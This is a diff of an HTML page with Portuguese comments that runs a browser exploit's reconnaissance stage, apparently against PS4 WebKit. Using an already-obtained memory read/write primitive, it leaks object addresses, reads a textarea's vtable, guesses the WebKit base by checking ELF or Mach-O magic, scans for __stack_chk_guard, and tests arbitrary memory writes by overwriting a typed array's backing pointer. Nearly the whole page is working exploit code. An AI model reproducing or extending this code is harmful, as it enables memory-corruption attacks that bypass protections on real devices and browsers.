@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -55,7 +54,6 @@
     opacity: 0.45; cursor: not-allowed; transform: none;
     background: #374151; box-shadow: none;
   }
-  .hidden { display: none !important; }
 </style>
 </head>
 <body>
@@ -71,6 +69,7 @@
 <script type="module">
   import { establishPrimitive } from "./resources/core.js";
   import { installWindowP } from "./resources/mem.js";
+  import { int64 } from "./resources/int64.js";
 
   const status = document.getElementById("status");
   const logBox = document.getElementById("log");
@@ -111,30 +110,54 @@
       let textAddr = p.leakval(textarea);
       log(`textarea object @ 0x${textAddr.toString(16)}`, "info");
 
-      // 2. Vtable pointer (offset +0x18 no PS4 WebKit — ajuste se necessário)
+      // 2. Vtable pointer (offset +0x18 no PS4 WebKit)
       let vtablePtr = p.read8(textAddr.add32(0x18));
       log(`vtable ptr @ 0x${vtablePtr.toString(16)}`, "info");
 
       // 3. Primeiro entry do vtable
       let firstEntry = p.read8(vtablePtr);
       log(`first vtable entry @ 0x${firstEntry.toString(16)}`, "info");
+      log(`  (low=0x${firstEntry.low.toString(16)}, hi=0x${firstEntry.hi.toString(16)})`, "info");
 
-      // 4. Tentar achar base do WebKit (alinhado em 0x1000)
-      //    O offset abaixo é um PLACEHOLDER — substitua pelo offset real do seu firmware!
-      let webkitBaseGuess = firstEntry.sub32(firstEntry.low32() & 0xFFF); // alinha para baixo
-      log(`WebKit base (guess, aligned) ~ 0x${webkitBaseGuess.toString(16)}`, "warn");
+      // 4. Alinhar para baixo em 0x1000 para guess da base
+      let pageOffset = firstEntry.low & 0xFFF;
+      let webkitBaseGuess = firstEntry.sub32(pageOffset);
+      log(`WebKit base (guess, 0x1000 aligned) ~ 0x${webkitBaseGuess.toString(16)}`, "warn");
 
       // 5. Sanity check: ler magic bytes
       let magic = p.read4(webkitBaseGuess);
       let magicHex = "0x" + magic.toString(16).padStart(8, '0');
       log(`Magic at guessed base: ${magicHex}`, "info");
+
       if (magicHex === "0x464c457f") {
         log("ELF magic detectado! Base provavelmente correta.", "ok");
+      } else if (magicHex === "0xfeedfacf" || magicHex === "0xfeedface") {
+        log("Mach-O magic detectado! Base provavelmente correta.", "ok");
       } else {
-        log("Magic não é ELF. Ajuste o offset do vtable manualmente.", "warn");
+        log("Magic não reconhecido. Ajuste o offset do vtable manualmente.", "warn");
       }
 
-      // 6. Leak de alguns objetos no heap para mapear o layout
+      // 6. Tentar achar __stack_chk_guard via scan simples
+      //    (procurar padrão conhecido na memória do WebKit)
+      log("Iniciando scan por __stack_chk_guard...", "info");
+      let foundGuard = false;
+      for (let off = 0; off < 0x200000; off += 0x1000) {
+        try {
+          let candidate = webkitBaseGuess.add32(off);
+          let val = p.read8(candidate);
+          // __stack_chk_guard geralmente tem os 3 bytes superiores zerados e LSB != 0
+          if (val.hi === 0 && val.low !== 0 && (val.low & 0xFF000000) !== 0) {
+            log(`Possível __stack_chk_guard @ base+0x${off.toString(16)} = 0x${val.toString(16)}`, "info");
+            foundGuard = true;
+            break;
+          }
+        } catch (e) {}
+      }
+      if (!foundGuard) {
+        log("__stack_chk_guard não encontrado no scan rápido.", "warn");
+      }
+
+      // 7. Leak de alguns objetos no heap para mapear o layout
       log("Heap sample (5 arrays):", "info");
       for (let i = 0; i < 5; i++) {
         let arr = new Uint8Array(0x100);
@@ -142,13 +165,22 @@
         log(`  Array[${i}] @ 0x${addr.toString(16)}`, "info");
       }
 
-      // 7. Tentar ler __stack_chk_guard se soubermos um padrão
-      //    (isso requer offsets específicos do firmware)
+      // 8. Testar read/write rápido
+      log("Testando read/write no primitivo...", "info");
+      let testBuf = new Uint8Array(8);
+      let testAddr = p.leakval(testBuf);
+      let original = p.read8(testAddr.add32(0x10)); // m_vector offset
+      p.write8(testAddr.add32(0x10), new int64(0x41414141, 0x42424242));
+      let modified = p.read8(testAddr.add32(0x10));
+      p.write8(testAddr.add32(0x10), original); // restaurar
+      log(`  RW test: original=0x${original.toString(16)} modified=0x${modified.toString(16)}`, "ok");
+
       log("=== RECON FINALIZADO ===", "ok");
-      log("Próximo: ajuste o offset do vtable para sua versão de firmware.", "warn");
+      log("Próximo: informe o first vtable entry para calibrar offsets exatos.", "warn");
 
     } catch (e) {
       log(`ERRO no recon: ${e.name}: ${e.message}`, "err");
+      console.error(e);
     }
   };
 
@@ -173,12 +205,12 @@
 
       window.__carrier = carrier;
       window.__prim = prim;
+      window.int64 = int64; // expor para uso manual no console
 
       status.textContent = "RW Primitivo OK — Pronto para Recon";
       status.style.color = "#4ade80";
       btnRecon.disabled = false;
 
-      // Sanity check
       try {
         const testAddr = prim.leakval(prim);
         log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
